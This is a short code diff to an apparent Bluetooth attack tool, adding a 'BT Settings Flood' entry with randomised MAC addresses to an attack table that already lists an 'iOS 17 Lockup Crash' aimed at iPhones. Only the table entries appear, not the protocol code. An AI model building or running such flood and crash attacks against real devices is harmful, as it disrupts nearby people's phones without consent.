@@ -24,6 +24,16 @@ static Attack attacks[] = {
             },
     },
     {
+        .title = "BT Settings Flood",
+        .text = "Fills available BT devices",
+        .protocol = &protocol_nameflood,
+        .payload =
+            {
+                .random_mac = true,
+                .cfg.nameflood = {},
+            },
+    },
+    {
         .title = "iOS 17 Lockup Crash",
         .text = "Newer iPhones, long range",
         .protocol = &protocol_continuity,
